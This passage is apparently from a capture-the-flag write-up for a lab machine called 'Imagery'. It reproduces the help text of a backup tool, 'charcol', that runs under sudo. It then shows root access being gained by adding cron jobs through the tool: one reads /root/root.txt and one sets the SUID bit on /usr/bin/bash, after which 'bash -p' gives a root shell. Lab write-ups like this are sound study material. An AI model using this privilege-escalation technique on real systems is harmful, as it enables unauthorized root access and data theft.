░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help
mark@Imagery:/$ sudo charcol help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

*(need to reset the password first before proceeding)*

### Charcol interactive shell

```bash
mark@Imagery:/$ sudo charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-09 17:15:54] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> help
[2025-10-09 17:15:58] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification).
```

It provides a backup and fetch system that can encrypt, list, and extract files. The interactive shell (`charcol shell`) allows commands like `backup`, `fetch`, `extract`, and `auto add` for cron jobs.

This is useful because if we can control or misuse these commands, we might be able to **read or extract sensitive files**, or **execute system commands** through automated tasks.

### Exploiting job entries

The app’s `auto add` feature lets users save any shell command as a scheduled job. We can see this from the job entries in `auto list` and the saved command text. Because scheduled jobs may run with higher privileges, this lets an us run arbitrary commands and could lead to gaining elevated (root) access.

```bash
# Read
auto add --schedule "* * * * *" --command "cat /root/root.txt" --name "r" --log-output /tmp/cat.txt

# Copy
auto add --schedule "* * * * *" --command "cp /root/root.txt /tmp/copy.txt" --name "copy" --log-output /tmp/copy.txt

# Gain Root Acces
auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "r00t" --log-output /tmp/r00t.txt
```

These are three scheduled jobs with intents to **read a privileged file**, **copy a privileged file to /tmp**, and **attempt privilege escalation**.

## Shell as root

```bash
mark@Imagery:/$ sudo charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-09 17:35:24] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> auto add --schedule "* * * * *" --command "chmod +s /usr/bin/bash" --name "rude" --log-output /tmp/rude.txt
[2025-10-09 17:35:27] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-09 17:35:31] [INFO] System password verified successfully.
[2025-10-09 17:35:31] [INFO] Auto job 'rude' (ID: 76ed8f26-7832-4a9e-b5d9-7e5fb1bd8a8f) added successfully. The job will run according to schedule.
[2025-10-09 17:35:31] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /usr/bin/bash >> /tmp/rude.txt 2>&1
charcol> auto list
[2025-10-09 17:35:38] [INFO] Charcol-managed auto jobs:
[2025-10-09 17:35:38] [INFO]   ID: 76ed8f26-7832-4a9e-b5d9-7e5fb1bd8a8f
[2025-10-09 17:35:38] [INFO]   Name: rude
[2025-10-09 17:35:38] [INFO]   Command: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /usr/bin/bash >> /tmp/rude.txt 2>&1
[2025-10-09 17:35:38] [INFO] ------------------------------
charcol> exit
[2025-10-09 17:35:45] [INFO] Exiting Charcol shell.
mark@Imagery:/$ /usr/bin/bash -p
mark@Imagery:/$ whoami
mark
mark@Imagery:/$ /usr/bin/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
4cb97885cad08391c3c3716f518xxxxx
bash-5.2# cat /home/
mark/     root.txt  web/      
bash-5.2# cat /home/mark/user.txt 
fe7c95516a548f954396df280d30xxxx

```
